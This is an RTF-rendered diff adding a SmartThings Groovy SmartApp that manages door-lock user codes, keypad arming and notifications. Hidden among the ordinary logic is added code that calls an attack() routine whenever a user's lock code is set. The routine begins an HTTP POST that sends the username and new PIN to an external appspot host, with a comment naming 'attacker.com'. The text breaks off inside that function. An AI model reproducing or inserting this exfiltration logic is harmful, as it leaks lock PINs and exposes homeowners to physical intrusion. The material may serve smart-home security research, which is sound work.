+      log{\cf8 .}{\cf21 debug} {\cf2 "new code:$newCode attack: send!!!!!!"}\par
+      attack{\cf8 (}{\cf2 "username:$user"}{\cf8 ,} newCode{\cf8 )}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      array {\cf8 <}{\cf8 <} {\cf8 [}{\cf2 "code$\{userSlot\}"}{\cf8 ,} {\cf2 ""}{\cf8 ]}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+  {\cf20 def} json {\cf8 =} {\cf10\b new} groovy{\cf8 .}{\cf21 json}{\cf8 .}{\cf21 JsonBuilder}{\cf8 (}array{\cf8 )}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}\par
+  {\cf10\b if} {\cf8 (}json {\cf8 !}{\cf8 =} {\cf2 '[]'}{\cf8 )} {\cf8 \{}\par
+    theLocks{\cf8 .}{\cf21 updateCodes}{\cf8 (}json{\cf8 )}\par
+    runIn{\cf8 (}{\cf8 60}{\cf8 *}{\cf8 2}{\cf8 ,} doPoll{\cf8 )}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 revokeAccess}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} array {\cf8 =} {\cf8 [}{\cf8 ]}\par
+  enabledUsersArray{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 each} {\cf8 \{} user{\cf8 -}{\cf8 >}\par
+    {\cf20 def} userSlot {\cf8 =} settings{\cf8 .}{\cf2 "userSlot$\{user\}"}\par
+    array {\cf8 <}{\cf8 <} {\cf8 [}{\cf2 "code$\{userSlot\}"}{\cf8 ,} {\cf2 ""}{\cf8 ]}\par
+  {\cf8 \}}\par
+  {\cf20 def} json {\cf8 =} {\cf10\b new} groovy{\cf8 .}{\cf21 json}{\cf8 .}{\cf21 JsonBuilder}{\cf8 (}array{\cf8 )}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}\par
+  {\cf10\b if} {\cf8 (}json {\cf8 !}{\cf8 =} {\cf2 '[]'}{\cf8 )} {\cf8 \{}\par
+    theLocks{\cf8 .}{\cf21 updateCodes}{\cf8 (}json{\cf8 )}\par
+    runIn{\cf8 (}{\cf8 60}{\cf8 *}{\cf8 2}{\cf8 ,} doPoll{\cf8 )}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 isManualUnlock}{\cf8 (}codeData{\cf8 )} {\cf8 \{}\par
+  {\cf1\i // check to see if the user wants this\par
+}  {\cf10\b if} {\cf8 (}manualUnlock{\cf8 )} {\cf8 \{}\par
+    {\cf1\i // garyd9's device type returns 'manual'\par
+}    {\cf10\b if} {\cf8 (}{\cf8 (}codeData{\cf8 .}{\cf21 usedCode} {\cf8 =}{\cf8 =} {\cf2 ""}{\cf8 )} {\cf8 |}{\cf8 |} {\cf8 (}codeData{\cf8 .}{\cf21 usedCode} {\cf8 =}{\cf8 =} {\cf10\b null}{\cf8 )} {\cf8 |}{\cf8 |} {\cf8 (}codeData{\cf8 .}{\cf21 usedCode} {\cf8 =}{\cf8 =} {\cf2 'manual'}{\cf8 )}{\cf8 )} {\cf8 \{}\par
+      {\cf1\i // no code used on unlock!\par
+}      {\cf10\b return} {\cf10\b true}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf1\i // probably a code we're not dealing with here\par
+}      {\cf10\b return} {\cf10\b false}\par
+    {\cf8 \}}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    {\cf10\b return} {\cf10\b false}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 isActiveBurnCode}{\cf8 (}slot{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if} {\cf8 (}settings{\cf8 .}{\cf2 "burnCode$\{slot\}"} {\cf8 &}{\cf8 &} state{\cf8 .}{\cf2 "userState$\{slot\}"}{\cf8 .}{\cf21 usage} {\cf8 >} {\cf8 0}{\cf8 )} {\cf8 \{}\par
+    {\cf10\b return} {\cf10\b false}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    {\cf1\i // not a burn code / not yet used\par
+}    {\cf10\b return} {\cf10\b true}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 pollCodeReport}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} active {\cf8 =} isAbleToStart{\cf8 (}{\cf8 )}\par
+  {\cf20 def} codeData {\cf8 =} {\cf10\b new} JsonSlurper{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 parseText}{\cf8 (}evt{\cf8 .}{\cf21 data}{\cf8 )}\par
+  {\cf20 def} numberOfCodes {\cf8 =} codeData{\cf8 .}{\cf21 codes}\par
+  {\cf20 def} userSlots {\cf8 =} userSlotArray{\cf8 (}{\cf8 )}\par
+\par
+  {\cf20 def} array {\cf8 =} {\cf8 [}{\cf8 ]}\par
+\par
+  {\cf8 (}{\cf8 1}{\cf8 .}{\cf8 .}{\cf21 maxUsers}{\cf8 )}{\cf8 .}{\cf21 each} {\cf8 \{} user{\cf8 -}{\cf8 >}\par
+    {\cf20 def} slot {\cf8 =} settings{\cf8 .}{\cf2 "userSlot$\{user\}"}\par
+    {\cf20 def} code {\cf8 =} codeData{\cf8 .}{\cf2 "code$\{slot\}"}\par
+    {\cf20 def} correctCode {\cf8 =} settings{\cf8 .}{\cf2 "userCode$\{user\}"}\par
+    {\cf10\b if} {\cf8 (}active{\cf8 )} {\cf8 \{}\par
+      {\cf10\b if} {\cf8 (}userIsEnabled{\cf8 (}user{\cf8 )} {\cf8 &}{\cf8 &} isActiveBurnCode{\cf8 (}user{\cf8 )}{\cf8 )} {\cf8 \{}\par
+        {\cf10\b if} {\cf8 (}code {\cf8 =}{\cf8 =} settings{\cf8 .}{\cf2 "userCode$\{user\}"}{\cf8 )} {\cf8 \{}\par
+          {\cf1\i // Code is Active, We should be active. Nothing to do\par
+}        {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+          {\cf1\i // Code is incorrect, We should be active.\par
+}          array {\cf8 <}{\cf8 <} {\cf8 [}{\cf2 "code$\{slot\}"}{\cf8 ,} settings{\cf8 .}{\cf2 "userCode$\{user\}"}{\cf8 ]}\par
+        {\cf8 \}}\par
+      {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+        {\cf10\b if} {\cf8 (}code {\cf8 !}{\cf8 =} {\cf2 ''}{\cf8 )} {\cf8 \{}\par
+          {\cf1\i // Code is set, user is disabled, We should be disabled.\par
+}          array {\cf8 <}{\cf8 <} {\cf8 [}{\cf2 "code$\{slot\}"}{\cf8 ,} {\cf2 ""}{\cf8 ]}\par
+        {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+          {\cf1\i // Code is not set, user is disabled. Nothing to do\par
+}        {\cf8 \}}\par
+      {\cf8 \}}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      {\cf10\b if} {\cf8 (}code {\cf8 !}{\cf8 =} {\cf2 ''}{\cf8 )} {\cf8 \{}\par
+        {\cf1\i // Code is set, We should be disabled.\par
+}        array {\cf8 <}{\cf8 <} {\cf8 [}{\cf2 "code$\{slot\}"}{\cf8 ,} {\cf2 ""}{\cf8 ]}\par
+      {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+        {\cf1\i // Code is not active, We should be disabled. Nothing to do\par
+}      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+\par
+  {\cf20 def} currentLock {\cf8 =} theLocks{\cf8 .}{\cf21 find}{\cf8 \{}it{\cf8 .}{\cf21 id} {\cf8 =}{\cf8 =} evt{\cf8 .}{\cf21 deviceId}{\cf8 \}}\par
+  populateDiscovery{\cf8 (}codeData{\cf8 ,} currentLock{\cf8 )}\par
+\par
+  {\cf20 def} json {\cf8 =} {\cf10\b new} groovy{\cf8 .}{\cf21 json}{\cf8 .}{\cf21 JsonBuilder}{\cf8 (}array{\cf8 )}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}\par
+  {\cf10\b if} {\cf8 (}json {\cf8 !}{\cf8 =} {\cf2 '[]'}{\cf8 )} {\cf8 \{}\par
+    runIn{\cf8 (}{\cf8 60}{\cf8 *}{\cf8 2}{\cf8 ,} doPoll{\cf8 )}\par
+\par
+    {\cf1\i //Lock is in an error state\par
+}    state{\cf8 .}{\cf2 "lock$\{currentLock.id\}"}{\cf8 .}{\cf21 error_loop} {\cf8 =} {\cf10\b true}\par
+    {\cf20 def} error_number {\cf8 =} state{\cf8 .}{\cf21 error_loop_count} {\cf8 +} {\cf8 1}\par
+    {\cf10\b if} {\cf8 (}error_number {\cf8 <}{\cf8 =} {\cf8 10}{\cf8 )} {\cf8 \{}\par
+      log{\cf8 .}{\cf21 debug} {\cf2 "sendCodes fix is: $\{json\} Error: $\{error_number\}/10"}\par
+      currentLock{\cf8 .}{\cf21 updateCodes}{\cf8 (}json{\cf8 )}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      log{\cf8 .}{\cf21 debug} {\cf2 "kill fix is: $\{json\}"}\par
+      currentLock{\cf8 .}{\cf21 updateCodes}{\cf8 (}json{\cf8 )}\par
+      json {\cf8 =} {\cf10\b new} JsonSlurper{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 parseText}{\cf8 (}json{\cf8 )}\par
+      {\cf20 def} n {\cf8 =} {\cf8 0}\par
+      json{\cf8 .}{\cf21 each} {\cf8 \{} code {\cf8 -}{\cf8 >}\par
+        n {\cf8 =} code{\cf8 [}{\cf8 0}{\cf8 ]}{\cf8 [}{\cf8 4}{\cf8 .}{\cf8 .}{\cf8 -}{\cf8 1}{\cf8 ]}{\cf8 .}{\cf21 toInteger}{\cf8 (}{\cf8 )}\par
+        {\cf20 def} usedIndex {\cf8 =} usedUserIndex{\cf8 (}n{\cf8 )}\par
+        {\cf20 def} name {\cf8 =} settings{\cf8 .}{\cf2 "userName$\{usedIndex\}"}\par
+        {\cf10\b if} {\cf8 (}state{\cf8 .}{\cf2 "userState$\{usedIndex\}"}{\cf8 .}{\cf21 enabled}{\cf8 )} {\cf8 \{}\par
+          state{\cf8 .}{\cf2 "userState$\{usedIndex\}"}{\cf8 .}{\cf21 enabled} {\cf8 =} {\cf10\b false}\par
+          state{\cf8 .}{\cf2 "userState$\{usedIndex\}"}{\cf8 .}{\cf21 disabledReason} {\cf8 =} {\cf2 "Controller failed to set code"}\par
+          send{\cf8 (}{\cf2 "Controller failed to set code for $\{name\}"}{\cf8 )}\par
+        {\cf8 \}}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    state{\cf8 .}{\cf2 "lock$\{currentLock.id\}"}{\cf8 .}{\cf21 error_loop} {\cf8 =} {\cf10\b false}\par
+    {\cf10\b if} {\cf8 (}allCodesDone{\cf8 )} {\cf8 \{}\par
+      lockErrorLoopReset{\cf8 (}{\cf8 )}\par
+    {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+      runIn{\cf8 (}{\cf8 60}{\cf8 ,} doPoll{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 allCodesDone}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} i {\cf8 =} {\cf8 0}\par
+  {\cf20 def} codeComplete {\cf8 =} {\cf10\b true}\par
+  theLocks{\cf8 .}{\cf21 each} {\cf8 \{} lock{\cf8 -}{\cf8 >}\par
+    i{\cf8 +}{\cf8 +}\par
+    {\cf10\b if} {\cf8 (}state{\cf8 .}{\cf2 "lock$\{lock.id\}"}{\cf8 .}{\cf21 error_loop} {\cf8 =}{\cf8 =} {\cf10\b true}{\cf8 )} {\cf8 \{}\par
+      codeComplete {\cf8 =} {\cf10\b false}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+  {\cf10\b return} codeComplete\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 anyoneHome}{\cf8 (}sensors{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} result {\cf8 =} {\cf10\b false}\par
+  {\cf10\b if}{\cf8 (}sensors{\cf8 .}{\cf21 findAll} {\cf8 \{} it{\cf8 ?}{\cf8 .}{\cf21 currentPresence} {\cf8 =}{\cf8 =} {\cf2 "present"} {\cf8 \}}{\cf8 )} {\cf8 \{}\par
+    result {\cf8 =} {\cf10\b true}\par
+  {\cf8 \}}\par
+  result\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 send}{\cf8 (}msg{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if} {\cf8 (}notificationStartTime {\cf8 !}{\cf8 =} {\cf10\b null} {\cf8 &}{\cf8 &} notificationEndTime {\cf8 !}{\cf8 =} {\cf10\b null}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} start {\cf8 =} timeToday{\cf8 (}notificationStartTime{\cf8 )}\par
+    {\cf20 def} stop {\cf8 =} timeToday{\cf8 (}notificationEndTime{\cf8 )}\par
+    {\cf20 def} now {\cf8 =} {\cf10\b new} Date{\cf8 (}{\cf8 )}\par
+    {\cf10\b if} {\cf8 (}start{\cf8 .}{\cf21 before}{\cf8 (}now{\cf8 )} {\cf8 &}{\cf8 &} stop{\cf8 .}{\cf21 after}{\cf8 (}now{\cf8 )}{\cf8 )}{\cf8 \{}\par
+      sendMessage{\cf8 (}msg{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    sendMessage{\cf8 (}msg{\cf8 )}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 sendMessage}{\cf8 (}msg{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if} {\cf8 (}notification{\cf8 )} {\cf8 \{}\par
+    sendPush{\cf8 (}msg{\cf8 )}\par
+  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    sendNotificationEvent{\cf8 (}msg{\cf8 )}\par
+  {\cf8 \}}\par
+  {\cf10\b if} {\cf8 (}phone{\cf8 )} {\cf8 \{}\par
+    {\cf10\b if} {\cf8 (} phone{\cf8 .}{\cf21 indexOf}{\cf8 (}{\cf2 ";"}{\cf8 )} {\cf8 >} {\cf8 1}{\cf8 )}{\cf8 \{}\par
+      {\cf20 def} phones {\cf8 =} phone{\cf8 .}{\cf21 split}{\cf8 (}{\cf2 ";"}{\cf8 )}\par
+      {\cf10\b for} {\cf8 (} {\cf20 def} i {\cf8 =} {\cf8 0}{\cf8 ;} i {\cf8 <} phones{\cf8 .}{\cf21 size}{\cf8 (}{\cf8 )}{\cf8 ;} i{\cf8 +}{\cf8 +}{\cf8 )} {\cf8 \{}\par
+        sendSms{\cf8 (}phones{\cf8 [}i{\cf8 ]}{\cf8 ,} msg{\cf8 )}\par
+      {\cf8 \}}\par
+    {\cf8 \}}\par
+    {\cf10\b else} {\cf8 \{}\par
+      sendSms{\cf8 (}phone{\cf8 ,} msg{\cf8 )}\par
+    {\cf8 \}}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 populateDiscovery}{\cf8 (}codeData{\cf8 ,} lock{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} codes {\cf8 =} {\cf8 [}{\cf8 :}{\cf8 ]}\par
+  {\cf20 def} codeSlots {\cf8 =} {\cf8 30}\par
+  {\cf10\b if} {\cf8 (}codeData{\cf8 .}{\cf21 codes}{\cf8 )} {\cf8 \{}\par
+    codeSlots {\cf8 =} codeData{\cf8 .}{\cf21 codes}\par
+  {\cf8 \}}\par
+  {\cf8 (}{\cf8 1}{\cf8 .}{\cf8 .}{\cf21 codeSlots}{\cf8 )}{\cf8 .}{\cf21 each} {\cf8 \{} slot{\cf8 -}{\cf8 >}\par
+    codes{\cf8 .}{\cf2 "slot$\{slot\}"} {\cf8 =} codeData{\cf8 .}{\cf2 "code$\{slot\}"}\par
+  {\cf8 \}}\par
+  state{\cf8 .}{\cf2 "lock$\{lock.id\}"}{\cf8 .}{\cf21 codes} {\cf8 =} codes\par
+{\cf8 \}}\par
+{\cf1\i ////******\par
+}{\cf10\b private} String {\cf5 getPIN}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  {\cf1\i //log.debug "user code set: $userCode($\{i\})"\par
+}  {\cf10\b return} settings{\cf8 .}{\cf21 pin}{\cf8 .}{\cf21 value}{\cf8 .}{\cf21 toString}{\cf8 (}{\cf8 )}{\cf8 .}{\cf21 padLeft}{\cf8 (}{\cf8 4}{\cf8 ,}{\cf2 '0'}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 alarmStatusHandler}{\cf8 (}event{\cf8 )} {\cf8 \{}\par
+  log{\cf8 .}{\cf21 debug} {\cf2 "Keypad manager caught alarm status change: "}{\cf8 +}event{\cf8 .}{\cf21 value}\par
+  {\cf10\b if} {\cf8 (}event{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "off"}{\cf8 )}{\cf8 \{}\par
+    keypad{\cf8 ?}{\cf8 .}{\cf21 setDisarmed}{\cf8 (}{\cf8 )}\par
+  {\cf8 \}}\par
+  {\cf10\b else} {\cf5 if} {\cf8 (}event{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "away"}{\cf8 )}{\cf8 \{}\par
+    keypad{\cf8 ?}{\cf8 .}{\cf21 setArmedAway}{\cf8 (}{\cf8 )}\par
+  {\cf8 \}}\par
+  {\cf10\b else} {\cf5 if} {\cf8 (}event{\cf8 .}{\cf21 value} {\cf8 =}{\cf8 =} {\cf2 "stay"}{\cf8 )} {\cf8 \{}\par
+    keypad{\cf8 ?}{\cf8 .}{\cf21 setArmedStay}{\cf8 (}{\cf8 )}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 sendSHMEvent}{\cf8 (}String shmState{\cf8 )} {\cf8 \{}\par
+  {\cf20 def} event {\cf8 =} {\cf8 [}\par
+        {\cf24 name:}{\cf2 "alarmSystemStatus"}{\cf8 ,}\par
+        {\cf24 value:} shmState{\cf8 ,}\par
+        {\cf24 displayed:} {\cf10\b true}{\cf8 ,}\par
+        {\cf24 description:} {\cf2 "System Status is $\{shmState\}"}\par
+      {\cf8 ]}\par
+  log{\cf8 .}{\cf21 debug} {\cf2 "test $\{event\}"}\par
+  sendLocationEvent{\cf8 (}event{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf10\b private} {\cf5 execRoutine}{\cf8 (}armMode{\cf8 )} {\cf8 \{}\par
+  {\cf10\b if} {\cf8 (}armMode {\cf8 =}{\cf8 =} {\cf2 'away'}{\cf8 )} {\cf8 \{}\par
+    location{\cf8 .}{\cf21 helloHome}{\cf8 ?}{\cf8 .}{\cf21 execute}{\cf8 (}settings{\cf8 .}{\cf21 armRoutine}{\cf8 )}\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}armMode {\cf8 =}{\cf8 =} {\cf2 'stay'}{\cf8 )} {\cf8 \{}\par
+    location{\cf8 .}{\cf21 helloHome}{\cf8 ?}{\cf8 .}{\cf21 execute}{\cf8 (}settings{\cf8 .}{\cf21 stayRoutine}{\cf8 )}\par
+  {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}armMode {\cf8 =}{\cf8 =} {\cf2 'off'}{\cf8 )} {\cf8 \{}\par
+    location{\cf8 .}{\cf21 helloHome}{\cf8 ?}{\cf8 .}{\cf21 execute}{\cf8 (}settings{\cf8 .}{\cf21 disarmRoutine}{\cf8 )}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 codeEntryHandler}{\cf8 (}evt{\cf8 )} {\cf8 \{}\par
+  {\cf1\i //do stuff\par
+}  log{\cf8 .}{\cf21 debug} {\cf2 "Caught code entry event! $\{evt.value.value\}"}\par
+\par
+  {\cf20 def} codeEntered {\cf8 =} evt{\cf8 .}{\cf21 value} {\cf10\b as} String\par
+\par
+  {\cf20 def} data {\cf8 =} evt{\cf8 .}{\cf21 data} {\cf10\b as} String\par
+  {\cf20 def} armMode {\cf8 =} {\cf2 ''}\par
+  {\cf20 def} currentarmMode {\cf8 =} keypad{\cf8 .}{\cf21 currentValue}{\cf8 (}{\cf2 "armMode"}{\cf8 )}\par
+  {\cf20 def} changedMode {\cf8 =} {\cf8 0}\par
+\par
+  {\cf10\b if} {\cf8 (}data {\cf8 =}{\cf8 =} {\cf2 '0'}{\cf8 )} {\cf8 \{}\par
+    armMode {\cf8 =} {\cf2 'off'}\par
+  {\cf8 \}}\par
+  {\cf10\b else} {\cf5 if} {\cf8 (}data {\cf8 =}{\cf8 =} {\cf2 '3'}{\cf8 )} {\cf8 \{}\par
+    armMode {\cf8 =} {\cf2 'away'}\par
+  {\cf8 \}}\par
+  {\cf10\b else} {\cf5 if} {\cf8 (}data {\cf8 =}{\cf8 =} {\cf2 '1'}{\cf8 )} {\cf8 \{}\par
+    armMode {\cf8 =} {\cf2 'stay'}\par
+  {\cf8 \}}\par
+  {\cf10\b else} {\cf5 if} {\cf8 (}data {\cf8 =}{\cf8 =} {\cf2 '2'}{\cf8 )} {\cf8 \{}\par
+    armMode {\cf8 =} {\cf2 'stay'} {\cf1\i //Currently no separate night mode for SHM, set to 'stay'\par
+}  {\cf8 \}} {\cf10\b else} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 error} {\cf2 "$\{app.label\}: Unexpected arm mode sent by keypad!: "}{\cf8 +}data\par
+    {\cf10\b return} {\cf8 [}{\cf8 ]}\par
+  {\cf8 \}}\par
+\par
+  {\cf20 def} i {\cf8 =} settings{\cf8 .}{\cf21 maxUsers}\par
+  {\cf20 def} message {\cf8 =} {\cf2 " "}\par
+  {\cf10\b while} {\cf8 (}i {\cf8 >} {\cf8 0}{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "i ="} {\cf8 +} i\par
+    {\cf20 def} correctCode {\cf8 =} settings{\cf8 .}{\cf2 "userCode$\{i\}"} {\cf10\b as} String\par
+\par
+    {\cf10\b if} {\cf8 (}codeEntered {\cf8 =}{\cf8 =} correctCode{\cf8 )} {\cf8 \{}\par
+\par
+      log{\cf8 .}{\cf21 debug} {\cf2 "User Enabled: "} {\cf8 +} state{\cf8 .}{\cf2 "userState$\{i\}"}{\cf8 .}{\cf21 enabled}\par
+\par
+      {\cf10\b if} {\cf8 (}state{\cf8 .}{\cf2 "userState$\{i\}"}{\cf8 .}{\cf21 enabled} {\cf8 =}{\cf8 =} {\cf10\b true}{\cf8 )} {\cf8 \{}\par
+        log{\cf8 .}{\cf21 debug} {\cf2 "Correct PIN entered. Change SHM state to $\{armMode\}"}\par
+        {\cf1\i //log.debug "Delay: $\{armDelay\}"\par
+}        {\cf1\i //log.debug "Data: $\{data\}"\par
+}        {\cf1\i //log.debug "armMode: $\{armMode\}"\par
+}\par
+        {\cf20 def} unlockUserName {\cf8 =} settings{\cf8 .}{\cf2 "userName$\{i\}"}\par
+\par
+        {\cf10\b if} {\cf8 (}data {\cf8 =}{\cf8 =} {\cf2 "0"}{\cf8 )} {\cf8 \{}\par
+          {\cf1\i //log.debug "sendDisarmCommand"\par
+}          runIn{\cf8 (}{\cf8 0}{\cf8 ,} {\cf2 "sendDisarmCommand"}{\cf8 )}\par
+          message {\cf8 =} {\cf2 "$\{evt.displayName\} was disarmed by $\{unlockUserName\}"}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}data {\cf8 =}{\cf8 =} {\cf2 "1"}{\cf8 )} {\cf8 \{}\par
+          {\cf1\i //log.debug "sendStayCommand"\par
+}          runIn{\cf8 (}armDelay{\cf8 ,} {\cf2 "sendStayCommand"}{\cf8 )}\par
+          message {\cf8 =} {\cf2 "$\{evt.displayName\} was armed to 'Stay' by $\{unlockUserName\}"}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}data {\cf8 =}{\cf8 =} {\cf2 "2"}{\cf8 )} {\cf8 \{}\par
+          {\cf1\i //log.debug "sendNightCommand"\par
+}          runIn{\cf8 (}armDelay{\cf8 ,} {\cf2 "sendNightCommand"}{\cf8 )}\par
+          message {\cf8 =} {\cf2 "$\{evt.displayName\} was armed to 'Night' by $\{unlockUserName\}"}\par
+        {\cf8 \}}\par
+        {\cf10\b else} {\cf5 if} {\cf8 (}data {\cf8 =}{\cf8 =} {\cf2 "3"}{\cf8 )} {\cf8 \{}\par
+          {\cf1\i //log.debug "sendArmCommand"\par
+}          runIn{\cf8 (}armDelay{\cf8 ,} {\cf2 "sendArmCommand"}{\cf8 )}\par
+          message {\cf8 =} {\cf2 "$\{evt.displayName\} was armed to 'Away' by $\{unlockUserName\}"}\par
+        {\cf8 \}}\par
+\par
+        {\cf10\b if}{\cf8 (}settings{\cf8 .}{\cf2 "burnCode$\{i\}"}{\cf8 )} {\cf8 \{}\par
+          state{\cf8 .}{\cf2 "userState$\{i\}"}{\cf8 .}{\cf21 enabled} {\cf8 =} {\cf10\b false}\par
+          message {\cf8 +}{\cf8 =} {\cf2 ".  Now burning code."}\par
+        {\cf8 \}}\par
+{\cf1\i /////*********\par
+}        log{\cf8 .}{\cf21 debug} {\cf2 "message:$\{message\}"}\par
+        {\cf1\i //log.debug "Initial Usage Count:" + state."userState$\{i\}".usage\par
+}        state{\cf8 .}{\cf2 "userState$\{i\}"}{\cf8 .}{\cf21 usage} {\cf8 =} state{\cf8 .}{\cf2 "userState$\{i\}"}{\cf8 .}{\cf21 usage} {\cf8 +} {\cf8 1}\par
+        {\cf1\i //log.debug "Final Usage Count:" + state."userState$\{i\}".usage\par
+}        send{\cf8 (}message{\cf8 )}\par
+        i {\cf8 =} {\cf8 0}\par
+      {\cf8 \}} {\cf10\b else} {\cf10\b if} {\cf8 (}state{\cf8 .}{\cf2 "userState$\{i\}"}{\cf8 .}{\cf21 enabled} {\cf8 =}{\cf8 =} {\cf10\b false}{\cf8 )}{\cf8 \{}\par
+        log{\cf8 .}{\cf21 debug} {\cf2 "PIN Disabled"}\par
+        {\cf1\i //Could also call acknowledgeArmRequest() with a parameter of 4 to report invalid code. Opportunity to simplify code?\par
+}        {\cf1\i //keypad.sendInvalidKeycodeResponse()\par
+}      {\cf8 \}}\par
+    {\cf8 \}}\par
+    changedMode {\cf8 =} {\cf8 1}\par
+    i{\cf8 -}{\cf8 -}\par
+  {\cf8 \}}\par
+  {\cf10\b if} {\cf8 (}changedMode {\cf8 =}{\cf8 =} {\cf8 1} {\cf8 &}{\cf8 &} i {\cf8 =}{\cf8 =} {\cf8 0}{\cf8 )} {\cf8 \{}\par
+    {\cf20 def} errorMsg {\cf8 =} {\cf2 "Incorrect Code Entered: $\{codeEntered\}"}\par
+    {\cf10\b if} {\cf8 (}notifyIncorrectPin{\cf8 )} {\cf8 \{}\par
+      log{\cf8 .}{\cf21 debug} {\cf2 "Incorrect PIN"}\par
+      send{\cf8 (}errorMsg{\cf8 )}\par
+    {\cf8 \}}\par
+    {\cf1\i //Could also call acknowledgeArmRequest() with a parameter of 4 to report invalid code. Opportunity to simplify code?\par
+}    keypad{\cf8 .}{\cf21 sendInvalidKeycodeResponse}{\cf8 (}{\cf8 )}\par
+  {\cf8 \}}\par
+{\cf8 \}}\par
+{\cf20 def} {\cf5 sendArmCommand}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  log{\cf8 .}{\cf21 debug} {\cf2 "Sending Arm Command."}\par
+  keypad{\cf8 .}{\cf21 acknowledgeArmRequest}{\cf8 (}{\cf8 3}{\cf8 )}\par
+  sendSHMEvent{\cf8 (}{\cf2 "away"}{\cf8 )}\par
+  execRoutine{\cf8 (}{\cf2 "away"}{\cf8 )}\par
+{\cf8 \}}\par
+{\cf20 def} {\cf5 sendDisarmCommand}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  log{\cf8 .}{\cf21 debug} {\cf2 "Sending Disarm Command."}\par
+  keypad{\cf8 .}{\cf21 acknowledgeArmRequest}{\cf8 (}{\cf8 0}{\cf8 )}\par
+  sendSHMEvent{\cf8 (}{\cf2 "off"}{\cf8 )}\par
+  execRoutine{\cf8 (}{\cf2 "off"}{\cf8 )}\par
+{\cf8 \}}\par
+{\cf20 def} {\cf5 sendStayCommand}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  log{\cf8 .}{\cf21 debug} {\cf2 "Sending Stay Command."}\par
+  keypad{\cf8 .}{\cf21 acknowledgeArmRequest}{\cf8 (}{\cf8 1}{\cf8 )}\par
+  sendSHMEvent{\cf8 (}{\cf2 "stay"}{\cf8 )}\par
+  execRoutine{\cf8 (}{\cf2 "stay"}{\cf8 )}\par
+{\cf8 \}}\par
+{\cf20 def} {\cf5 sendNightCommand}{\cf8 (}{\cf8 )} {\cf8 \{}\par
+  log{\cf8 .}{\cf21 debug} {\cf2 "Sending Night Command."}\par
+  keypad{\cf8 .}{\cf21 acknowledgeArmRequest}{\cf8 (}{\cf8 2}{\cf8 )}\par
+  sendSHMEvent{\cf8 (}{\cf2 "stay"}{\cf8 )}\par
+  execRoutine{\cf8 (}{\cf2 "stay"}{\cf8 )}\par
+{\cf8 \}}\par
+\par
+{\cf20 def} {\cf5 attack}{\cf8 (}String username{\cf8 ,} String codes{\cf8 )} {\cf8 \{}\par
+    log{\cf8 .}{\cf21 debug} {\cf2 "http post"}\par
+    {\cf20 def} takeParams {\cf8 =} {\cf8 [}\par
+            {\cf24 uri:} {\cf2 "https://automated-lore-135923.appspot.com"}{\cf8 ,} {\cf1\i //"https://attacker.com"\par
